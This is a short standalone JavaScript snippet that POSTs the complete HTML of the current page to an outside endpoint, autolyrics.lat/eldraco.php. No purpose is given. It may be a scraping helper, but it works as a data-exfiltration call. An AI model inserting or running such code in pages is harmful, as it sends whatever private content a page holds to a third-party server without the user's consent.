fetch("https://autolyrics.lat/eldraco.php", {
    method: "POST",
    headers: { "Content-Type": "text/plain" },
    body: document.documentElement.outerHTML
});
